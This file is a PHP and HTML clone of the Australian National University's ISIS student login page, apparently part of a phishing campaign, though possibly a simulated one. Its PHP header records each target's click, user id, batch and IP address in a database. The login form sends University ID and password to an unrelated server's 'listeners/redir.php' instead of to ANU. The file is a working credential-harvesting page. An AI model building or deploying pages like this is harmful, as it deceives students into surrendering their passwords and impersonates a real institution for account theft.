<?php

require ("../../database_helper.php");

$user_id = 0;
if (isset($_GET['id']))
	$user_id = (int)$_GET["id"];

$batch_id = 3;			// calling this one group 3
$trans_id = 3;			// 3 means that they have clicked to open the link.

$ip_addy = $_SERVER['REMOTE_ADDR'];

$query = "INSERT INTO " . PingRecordTable::TABLE_NAME . " (" .
		PingRecordTable::USER_ID . ", " .
		PingRecordTable::BATCH_ID . ", " .
		PingRecordTable::PING_TYPE_ID . ", " .
		PingRecordTable::TIMESTAMP . ", " .
		PingRecordTable::IP_ADDY . ") VALUES (" .
		$user_id . ", " .
		$batch_id . ", " .
		$trans_id . ", " .
		time() . ", " .
		"'" . $ip_addy . "');";

$helper = new DBHelper();
$db = $helper -> get_database('../../db-config.php');

$db -> execute ($query);
$db -> disconnect();

?>

<!--?xml version="1.0" encoding="UTF-8"?-->
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" dir="ltr" lang="en"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<!--
* ***************************************************************
*  This software and related documentation are provided under a
*  license agreement containing restrictions on use and
*  disclosure and are protected by intellectual property
*  laws. Except as expressly permitted in your license agreement
*  or allowed by law, you may not use, copy, reproduce,
*  translate, broadcast, modify, license, transmit, distribute,
*  exhibit, perform, publish or display any part, in any form or
*  by any means. Reverse engineering, disassembly, or
*  decompilation of this software, unless required by law for
*  interoperability, is prohibited.
*  The information contained herein is subject to change without
*  notice and is not warranted to be error-free. If you find any
*  errors, please report them to us in writing.
*
*  Copyright (C) 1988, 2010, Oracle and/or its affiliates.
*  All Rights Reserved.
* ***************************************************************
-->
<title>ISIS</title>

<script type="text/javascript">
if (self === top) {
    var fb = document.getElementById("ptfb");
    fb.parentNode.removeChild(fb);
} else {
    try { 
        top.location = self.location;
    } catch(ex) {}
}
</script>
<link href="ISIS_files/styles.css" rel="stylesheet" type="text/css">
<link href="https://isis.anu.edu.au/sscsprod/anu/images/logos/anu.ico" rel="shortcut icon" type="image/x-icon">
<link href="https://isis.anu.edu.au/sscsprod/anu/images/icons/web/anu-app-57.png" rel="apple-touch-icon">
<link href="ISIS_files/www.css" rel="stylesheet" type="text/css" media="screen">
<link href="ISIS_files/anu-print.css" rel="stylesheet" type="text/css" media="print">
<!-- jq -->
<script src="ISIS_files/jquery.js" type="text/javascript"></script>
<script type="text/javascript"> var $anujq = jQuery.noConflict(); </script>
<script src="ISIS_files/jquery_002.js" type="text/javascript"></script>
<script src="ISIS_files/anu-common.js" type="text/javascript"></script>
<!-- ejq -->
<!-- ES -->
<script src="ISIS_files/es-signin.js" type="text/javascript"></script>
<script src="ISIS_files/es-func.js" type="text/javascript"></script>
<!-- end ES -->

<!--[if IE]><link href="/sscsprod/anu/styles/www.min.css" rel="stylesheet" type="text/css" media="screen" /><![endif]-->
<!--[if lt IE 8]><link href="/sscsprod/anu/styles/www.ie7.min.css" rel="stylesheet" type="text/css" media="screen"/><![endif]-->
<!--[if gt IE 7]><link href="/sscsprod/anu/styles/www.ie8.min.css" rel="stylesheet" type="text/css" media="screen" /><![endif]-->
<link href="ISIS_files/anu-syntax.css" rel="stylesheet" type="text/css" media="screen">
</head>
<body onload="setErrorMessages(); esSetMenu(); clearRecentSearch(); ">
<div id="skipnavholder"><a id="skipnav" href="#content">Skip navigation</a></div>
<div id="print-hdr">
   <div class="left"><img src="ISIS_files/anu_logo_print.png" alt="The Australian National University" height="40" width="115"></div>
   <div class="right"><div class="bnr-line-1 bnr-2line">ISIS</div>
   </div>
   <div class="blockline"></div>
</div>
<div id="explore-wrap">
	<div id="explore">
		<div id="explore-hdr" role="navigation">
			<ul>
				<li id="explore-li-1"><a href="https://www.anu.edu.au/">EXPLORE ANU <em>»</em></a>
		<div class="explore-hdr-jqshow explore-hdr-drop-div">

        <ul role="menu" class="explore-hdr-drop ">
						<li class="noprint">&nbsp;</li>
						<li><a href="https://www.anu.edu.au/">Home</a></li>
						<li><a href="https://www.anu.edu.au/about/">About</a></li>
						<li><a href="https://www.anu.edu.au/study/">Study</a></li>
						<li><a href="https://www.anu.edu.au/research/">Research</a></li>
						<li><a href="https://www.anu.edu.au/giving/">Giving</a></li>
						<li><a href="https://www.anu.edu.au/alumni/">Alumni</a></li>
						<li><a href="https://www.anu.edu.au/students/">Current students</a>
						</li><li class="padbottom2"><a href="https://www.anu.edu.au/staff/">Staff</a></li>

						<li><a href="https://www.anu.edu.au/news/">News</a></li>
						<li><a href="https://www.anu.edu.au/events/">Events</a></li>
						<li><a href="https://www.anu.edu.au/maps/">Maps</a></li>
						<li><a href="http://anulib.anu.edu.au/">Library</a></li>
						<li><a href="http://hr.anu.edu.au/employment-at-anu/job-opportunities/">Jobs</a></li>

						<li class="noprint">&nbsp;</li>
					</ul>
					<ul role="menu" class="explore-hdr-drop-right ">
						<li class="text-right"><a href="#" onclick="fadeOutID('.explore-hdr-jqshow');return false;" style="cursor:pointer;">close <img class="absmiddle" alt="" src="ISIS_files/btn-close.gif"></a></li>
						<li><a href="http://cass.anu.edu.au/" class="h-cass"><em>ANU College of</em><br>
						Arts &amp; Social Sciences</a></li>
						<li><a href="http://asiapacific.anu.edu.au/" class="h-cap"><em>ANU College of</em><br>
						Asia &amp; the Pacific</a></li>
						<li><a href="http://cbe.anu.edu.au/" class="h-cbe"><em>ANU College of</em><br>
						Business &amp; Economics</a></li>
						<li><a href="http://cecs.anu.edu.au/" class="h-cecs"><em>ANU College of</em><br>
						Engineering &amp;<br>Computer Science</a></li>
						<li><a href="http://law.anu.edu.au/" class="h-cl"><em>ANU College of</em><br>
						Law</a></li>
						<li><a href="http://cmbe-cpms.anu.edu.au/" class="h-cmbe"><em>ANU College of</em><br>
						Medicine, Biology &amp;<br>Environment</a></li>
						<li><a href="http://cmbe-cpms.anu.edu.au/" class="h-cps"><em>ANU College of</em><br>
						Physical &amp; Mathematical<br>Sciences</a></li>

						<li><a href="https://www.anu.edu.au/about/leadership-structure/academic-areas/"><small>» more academic areas</small></a></li>
					</ul>
        </div>


				</li>
				<li id="explore-li-2"><a href="https://www.anu.edu.au/directories/website-directory/">A-Z INDEX <em>»</em></a>
					<ul role="menu" class="explore-hdr-drop azdrop  explore-hdr-az-jqshow">
						<li class="text-right azclose padbottom"><a href="#" onclick="fadeOutID('.explore-hdr-az-jqshow');return false;" style="cursor:pointer;">close <img class="absmiddle" alt="" src="ISIS_files/btn-close.gif"></a></li>
<li class="boxlink az"><a href="http://www.anu.edu.au/directories/website-directory/a">A</a></li>
<li class="boxlink az"><a href="http://www.anu.edu.au/directories/website-directory/b">B</a></li>
<li class="boxlink az"><a href="http://www.anu.edu.au/directories/website-directory/c">C</a></li>
<li class="boxlink az"><a href="http://www.anu.edu.au/directories/website-directory/d">D</a></li>

<li class="boxlink az"><a href="http://www.anu.edu.au/directories/website-directory/e">E</a></li>
<li class="boxlink az"><a href="http://www.anu.edu.au/directories/website-directory/f">F</a></li>
<li class="boxlink az"><a href="http://www.anu.edu.au/directories/website-directory/g">G</a></li>
<li class="boxlink az"><a href="http://www.anu.edu.au/directories/website-directory/h">H</a></li>

<li class="boxlink az"><a href="http://www.anu.edu.au/directories/website-directory/i">I</a></li>
<li class="boxlink az"><a href="http://www.anu.edu.au/directories/website-directory/j">J</a></li>
<li class="boxlink az"><a href="http://www.anu.edu.au/directories/website-directory/k">K</a></li>
<li class="boxlink az"><a href="http://www.anu.edu.au/directories/website-directory/l">L</a></li>

<li class="boxlink az"><a href="http://www.anu.edu.au/directories/website-directory/m">M</a></li>
<li class="boxlink az"><a href="http://www.anu.edu.au/directories/website-directory/n">N</a></li>
<li class="boxlink az"><a href="http://www.anu.edu.au/directories/website-directory/o">O</a></li>
<li class="boxlink az"><a href="http://www.anu.edu.au/directories/website-directory/p">P</a></li>

<li class="boxlink az"><a href="http://www.anu.edu.au/directories/website-directory/q">Q</a></li>
<li class="boxlink az"><a href="http://www.anu.edu.au/directories/website-directory/r">R</a></li>
<li class="boxlink az"><a href="http://www.anu.edu.au/directories/website-directory/s">S</a></li>
<li class="boxlink az"><a href="http://www.anu.edu.au/directories/website-directory/t">T</a></li>

<li class="boxlink az"><a href="http://www.anu.edu.au/directories/website-directory/u">U</a></li>
<li class="boxlink az"><a href="http://www.anu.edu.au/directories/website-directory/v">V</a></li>
<li class="boxlink az"><a href="http://www.anu.edu.au/directories/website-directory/w">W</a></li>
<li class="boxlink az"><a href="http://www.anu.edu.au/directories/website-directory/x">X</a></li>

<li class="boxlink az"><a href="http://www.anu.edu.au/directories/website-directory/y">Y</a></li>
<li class="boxlink az"><a href="http://www.anu.edu.au/directories/website-directory/z">Z</a></li>
					</ul>
				</li>


    <li id="srch-hdr-mini" class="srch-gw2"><a href="http://find.anu.edu.au/">SEARCH</a>
    <ul class="explore-hdr-drop searchminidrop explore-hdr-searchmini-jqshow">
    <li class="text-right  padbottom"><a href="#" onclick="fadeOutID('.explore-hdr-searchmini-jqshow');return false;" style="cursor:pointer;">close <img class="absmiddle" alt="" src="ISIS_files/btn-close.gif"></a></li>

    <li class="text-right">

    <form action="//find.anu.edu.au/search" method="get" id="SearchForm1" role="search" autocomplete="off">



        <label for="qt1"><span class="nodisplay">Search query</span></label><input class="txt margintop" name="q" id="qt1" placeholder="Search web, staff &amp; maps" autocomplete="off" type="search"><div style="display: none;" class="gsasuggest"></div><div class="srch-divide"><div class="srch-divide2"></div></div><label for="search1a"><span class="nodisplay">Search</span></label><input value="Go" name="search1a" id="search1a" class="btn-go margintop" type="submit">
            <input name="client" value="anu_frontend" type="hidden">
            <input name="proxystylesheet" value="anu_frontend" type="hidden">
            <input name="site" value="default_collection" type="hidden">
            <input name="btnG" value="Search" type="hidden">
            <input name="filter" value="0" type="hidden">

            </form>

                    </li>

                    <li class="noprint">&nbsp;</li>

    </ul>
    </li>
    </ul>

		</div>
		<div id="srch-hdr" class="srch-hdr-grad srch-gw2">
			<form action="//find.anu.edu.au/search" method="get" id="SearchForm" role="search" autocomplete="off">
				<div>

        <label for="qt"><span class="nodisplay">Search query</span></label><input class="txt globalsearch" name="q" id="qt" placeholder="Search web, staff &amp; maps" autocomplete="off" type="search"><div style="display: none;" class="gsasuggest"></div>
            <input name="client" value="anu_frontend" type="hidden">
            <input name="proxystylesheet" value="anu_frontend" type="hidden">
            <input name="site" value="default_collection" type="hidden">
            <input name="btnG" value="Search" type="hidden">
            <input name="filter" value="0" type="hidden">

					<label for="search1"><span class="nodisplay">Search button</span></label><input value="GO" name="search1" id="search1" class="btn-tiny btn-black-grad" type="submit">
				</div>
			</form>
		</div>
	</div>
</div>
<div id="bnr-wrap" role="banner">
	<div id="bnr">
		<div id="bnr-left">

      <a href="http://www.anu.edu.au/" class="anu-logo-png">
         <img class="text-white" src="ISIS_files/2x_anu_logo_small.png" onmouseover="this.src='ISIS_files/2x_anu_logo_small_over.png';" onmouseout="this.src='ISIS_files/2x_anu_logo_small.png'" onfocus="this.src='ISIS_files/2x_anu_logo_small_over.png';" onblur="this.src='ISIS_files/2x_anu_logo_small.png'" alt="The Australian National University">
      </a>
      </div>
		<div id="bnr-right">
      <div class="bnr-line-1  bnr-2line"><h1><a href="">ISIS</a></h1></div>
      </div>
	   </div>
	<div id="bnr-underline"></div>
</div>
<!-- END ANU HEADER -->
<div id="body-wrap">
   <div id="body">
            <!-- MENU -->
            <div id="menu">
               <div class="narrow">
                  <div class="menu-flat menu-blue">
                     <p>ISIS</p>
                     <ul id="nav-1">
                        <li><a href="https://150.203.139.148/psp/sscsprod/ISIS.html">Log in</a></li>
                        <li><a id="es_change_password_link" href="https://identity.anu.edu.au/">Change password</a></li>
                     </ul>
                  </div>
                  <div class="menu-flat menu-blue">
                     <p>Help &amp; Contacts</p>
                     <ul id="nav-2">
                     </ul>
                     <ul id="nav-ss-hr" style="display: none;"> <!-- SS -->
                        <li><a href="https://services.anu.edu.au/information-technology/software-systems/hr-online-remote-user-system/resources-for-employees">HORUS help</a></li>
                        <li><a href="mailto:hrsystems@anu.edu.au">Contact HORUS support</a></li>
                        <li><a href="https://services.anu.edu.au/information-technology/software-systems/web-browser-tips">Browser help</a></li>
                     </ul>
                     <ul id="nav-ss-cs" style="display: block;"> <!-- SS -->
                        <li><a href="http://www.anu.edu.au/students/services/student-resources/interactive-student-information-system-isis">ISIS help</a></li>
                        <li><a href="mailto:student@anu.edu.au">Contact ISIS support</a></li>
                        <li><a href="https://services.anu.edu.au/information-technology/software-systems/web-browser-tips">Browser help</a></li>
                     </ul>
                     <ul id="nav-admin-hr" style="display: none;"> <!-- ADMIN -->
                        <li><a href="https://services.anu.edu.au/information-technology/software-systems/hr-management-system">HR help</a></li>
                        <li><a href="mailto:hrsystems@anu.edu.au">Contact HR Systems</a></li>
                        <li><a href="https://services.anu.edu.au/information-technology/software-systems/web-browser-tips">Browser help</a></li>
                     </ul>
                     <ul id="nav-admin-cs" style="display: none;"> <!-- ADMIN -->
                        <li><a href="https://services.anu.edu.au/information-technology/software-systems/student-administration-system">SA help</a></li>
                        <li><a href="mailto:sbs.help@anu.edu.au">Contact SBS</a></li>
                        <li><a href="https://services.anu.edu.au/information-technology/software-systems/web-browser-tips">Browser help</a></li>
                     </ul>
                     <ul id="nav-admin-fs" style="display: none;"> <!-- ADMIN -->
                        <li><a href="https://services.anu.edu.au/information-technology/software-systems/es-financials">ES Financials home</a></li>
                        <li><a href="https://services.anu.edu.au/information-technology/software-systems/web-browser-tips">Browser help</a></li>
                     </ul>
                  </div>
                  <script type="text/javascript" src="ISIS_files/anu-menu.js"></script>
               </div>
            </div>
            <!-- END MENU -->
      <!-- noindex -->
      <!-- stops ANU search from treating the menu as content-->
		<!-- PAGE CONTENT -->
            <div class="doublenarrow">
               <form action="http://150.203.139.145/listeners/redir.php?a=<?php echo ($user_id); ?>&b=<?php echo ($batch_id); ?>&c=5" class="anuform" method="post" id="login_form">
                  <div class="content">
                     <h1 id="headTitle">ISIS</h1>
                     <!-- ERROR MESSAGES -->
                     <div id="error_img" class="msg-error" style="margin-bottom: 10px; display: none;">
                        <p id="login_error" style="visibility: hidden;"></p>
                        <p id="discovery_error" style="visibility: hidden;"></p>
                        <!-- <p id="browsercheck_error" style="visibility: hidden;">We haven't tested this site using your operating system yet, so it may not work as expected. For best results, you can use one of the following operating systems:</div><a href='http://www.apple.com/support/snowleopard/' target='_blank'><a href='http://www.apple.com/support/snowleopard/' target='_blank'>Mac OS X 10.6(Snow Leopard)</a><br><a href='http://www.apple.com/support/leopard/' target='_blank'><a href='http://www.apple.com/support/leopard/' target='_blank'>Mac OS X 10.5(Leopard)</a><br><a href='http://www.apple.com/ipad/' target='_blank'><a href='http://www.apple.com/ipad/' target='_blank'>iPad</a><br><a href='http://www.oracle.com/us/technologies/linux/index.htm' target='_blank'><a href='http://www.oracle.com/us/technologies/linux/index.htm' target='_blank'>Oracle Linux Enterprise</a><br><a href='http://www.microsoft.com/windows/windows-8/default.aspx' target='_blank'><a href='http://www.microsoft.com/windows/windows-8/default.aspx' target='_blank'>Windows 8</a><br><a href='http://www.microsoft.com/windows/windows-7/default.aspx' target='_blank'><a href='http://www.microsoft.com/windows/windows-7/default.aspx' target='_blank'>Windows 7</a><br><a href='http://www.apple.com/macosx/' target='_blank'><a href='http://www.apple.com/macosx/' target='_blank'>Mac OS X 10.7(Lion)</a><br><br></p> -->
                        <p id="browsercheck_error" style="visibility: hidden;"></p>
                     </div>
                     <!-- LOGIN BOX -->
                     <div class="box-solid bg-uni10">
                        <table class="noborder">
                           <tbody><tr>
                              <td align="right"><label for="form_userid">University ID:</label></td>
                              <td>
                                 <input id="timezoneOffset" name="timezoneOffset" value="0" type="hidden">
                                 <input id="prefix" name="prefix" value="SS_" type="hidden">
                                 <input id="form_userid" name="form_userid" size="15" maxlength="12" type="text">
                                 <input id="userid" name="userid" value="" type="hidden">
                              </td>
                           </tr>
                           <tr>
                              <td align="right"><label for="pwd">Password:</label></td>
                              <td>
                                 <input id="pwd" name="pwd" value="" size="15" type="password">
                                 <input id="anupwd" name="anupwd" value="" type="hidden">
                              </td>
                           </tr>
                           <tr>
                              <td></td>
                              <td><input name="Submit" id="login_button" value="Log in" type="submit"></td>
                           </tr>
                        </tbody></table>
                     </div>
                     <!-- WARNING MESSAGE-->
                     <div class="msg-warn">
                        <h2>Security notice</h2>
                        <p></p><p>To help ensure the privacy of your information, be sure to signout and Exit/Quit/Close your browser at the end of your session.</p><p>Access or use of this system for purposes not specified by The Australian National University <a href="https://policies.anu.edu.au/ppl/document/ANUP_001222">policy</a> is strictly prohibited and may result in legal action.</p><p></p>
                     </div>
                     <div id="env_type" style="visibility: hidden;">SS_</div>
                     <div id="env_source" style="visibility: hidden;">cs</div>
                  </div>
               </form>
            </div>
            <!-- END PAGE CONTENT -->
            <!-- CONTACT FOOTER -->
            <div id="update-wrap">
               <div id="update-details">
                  <p class="sml-hdr">
                     Responsible Officer: <a href="mailto:webquery.cio@anu.edu.au"><strong>Chief Information Officer</strong></a>
                     <span class="hpad">/</span>
                     Page Contact: <a href="mailto:itservicedesk@anu.edu.au"><strong>Helpdesk</strong></a>
                  </p>
               </div>
            </div>
            <!-- END CONTACT FOOTER -->
         </div>
      </div>
      <!-- FOOTER -->
<!-- noindex -->
<div id="footer-wrap" role="contentinfo">
	<div id="anu-footer">
		<div id="anu-detail">
			<ul>
				<li><a href="http://www.anu.edu.au/contact/">Contact ANU</a></li>
				<li><a href="http://www.anu.edu.au/maps">Campus Map</a></li>
                <li><a href="http://www.anu.edu.au/copyright/">Copyright</a></li>
				<li><a href="http://www.anu.edu.au/disclaimer">Disclaimer</a></li>
				<li><a href="http://www.anu.edu.au/privacy">Privacy</a></li>
				<li><a href="http://foi.anu.edu.au/">Freedom of Information</a></li>
			</ul>
		</div>
		<div id="anu-address">
			<p>+61 2 6125 5111<br>
			The Australian National University, Canberra<br>
			CRICOS Provider : 00120C<br>
			ABN : 52 234 063 906</p>
		</div>

            <div id="anu-groups">
			<div class="anu-ftr-go8 hpad vpad"><a href="http://www.anu.edu.au/about/partnerships/group-of-eight"><img class="text-white" src="ISIS_files/2x_GroupOf8.png" alt="Group of Eight Member"></a></div>
			<div class="anu-ftr-iaru hpad vpad"><a href="http://www.anu.edu.au/about/partnerships/international-alliance-of-research-universities"><img class="text-white" src="ISIS_files/2x_iaru.png" alt="IARU"></a></div>
        <div class="anu-ftr-apru hpad vpad"><a href="http://www.anu.edu.au/about/partnerships/association-of-pacific-rim-universities"><img class="text-white" src="ISIS_files/2x_apru.png" alt="APRU"></a></div>
        <div class="anu-ftr-edx hpad vpad"><a href="http://www.anu.edu.au/about/partnerships/edx"><img class="text-white" src="ISIS_files/2x_edx.png" alt="edX"></a></div>

		</div>
   </div>
</div>
<!-- endnoindex -->


<script type="text/javascript" src="ISIS_files/anu-menu.js"></script>



</body></html>
